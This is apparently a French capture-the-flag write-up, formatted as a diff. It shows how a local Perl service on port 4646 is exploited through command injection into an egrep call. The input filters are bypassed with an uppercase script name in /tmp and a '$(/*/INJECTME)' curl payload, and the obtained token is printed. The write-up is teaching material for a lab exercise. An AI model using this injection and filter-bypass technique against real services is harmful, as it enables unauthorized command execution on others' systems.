@@ -1,0 +1,33 @@
+On trouve un script perl sur le home
+
+Il écoute sur le port 4646 et récupère des arguments.
+
+Il effectue ensuite des regex:
+
+Les minuscules sont convertis en majuscules.
+Les espaces et le caractère qui les suivent sont supprimés.
+
+Le script utilise ensuite un egrep avec notre variable en argument.
+
+Nous pouvons donc injecter un getflag a ce moment
+
+Cependant notre injection ne doit pas être corrompue par les regex
+
+On peut donc créer un script dans /tmp avec un nom en majuscule:
+
+~$ cat /tmp/INJECTME
+#!/bin/bash
+
+getflag > /tmp/token
+~$ chmod +x /tmp/INJECTME
+
+La dernière étape est de trouver la bonne syntaxe à envoyer en argument:
+
+~$ curl 127.0.0.1:4646?x='$(/*/INJECTME)'
+..
+~$ cat /tmp/token
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+/*/INJECTME va chercher dans tout les dossier contenu dans / pour le binaire, /tmp/ serais converti en /TMP/ ce qui ne fonctionnerais pas, et on ne peut pas créer de dossier à la racine.
+
+Token: g1qKMiRpXf53AWhDaU7FEkczr 
